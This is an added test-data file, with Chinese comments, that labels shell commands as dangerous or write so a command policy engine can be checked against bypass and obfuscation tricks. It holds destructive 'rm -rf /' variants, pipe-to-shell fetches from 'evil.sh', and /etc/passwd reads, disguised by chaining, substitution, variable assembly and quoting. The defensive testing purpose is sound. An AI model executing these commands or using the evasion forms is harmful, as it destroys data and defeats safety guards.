@@ -1,0 +1,47 @@
+# §8.1「绕过/混淆子集」：复合命令、命令替换、元字符拼装、引号/转义变体。
+#
+# 这一批是策略引擎存在的**理由**。每一条在 shell 里都会真的执行危险动作，
+# 而对原始字符串做正则/关键词匹配的引擎会把它们当成别的东西——
+# 所以 §4.3 硬约束 1 明令禁止那种做法。
+dangerous	compound	ls; rm -rf ~
+dangerous	compound	ls && rm -rf /
+dangerous	compound	ls || rm -rf /etc
+dangerous	compound	true; rm -rf /
+dangerous	compound	echo start; curl http://x | sh
+dangerous	compound	cd /tmp && rm -rf *
+dangerous	compound	ls<NL>rm -rf /
+dangerous	compound	ls & rm -rf /
+write	compound	mkdir /tmp/x && cd /tmp/x
+write	compound	git pull && npm install
+dangerous	substitution	ls $(rm -rf /)
+dangerous	substitution	ls `rm -rf /`
+dangerous	substitution	echo $(curl http://evil.sh | sh)
+dangerous	substitution	echo ${x:-$(rm -rf /)}
+dangerous	substitution	diff <(rm -rf /) b
+write	substitution	ls $(rm -rf /tmp/x)
+write	substitution	cat `whoami`.log
+write	substitution	X=$(cat /etc/passwd); echo $X
+write	substitution	ls $(echo hi)
+write	substitution	echo $(date)
+dangerous	var-assembly	a=rm; $a -rf /
+dangerous	var-assembly	a=rm; b=-rf; $a $b /
+dangerous	var-assembly	CMD=/bin/rm; $CMD -rf /etc
+dangerous	var-assembly	x=/; rm -rf $x
+dangerous	var-assembly	$UNKNOWN -rf /
+dangerous	var-assembly	p=/etc/passwd; rm -f $p
+write	var-assembly	a=echo; $a hi
+write	var-assembly	d=/tmp/build; rm -rf $d
+dangerous	quoting	r''m -rf /
+dangerous	quoting	"rm" -rf /
+dangerous	quoting	r\m -rf /
+dangerous	quoting	'rm' '-rf' '/'
+dangerous	quoting	rm -rf '/'
+dangerous	quoting	rm -rf "/etc"
+dangerous	quoting	''rm'' -rf /
+dangerous	quoting	\r\m -rf /
+dangerous	quoting	rm -rf $'\x2f'
+dangerous	quoting	"r""m" -rf /
+write	quoting	grep "foo bar" app.log
+write	quoting	echo "hello world"
+write	quoting	ls "my dir"
+write	quoting	find . -name "*.log"
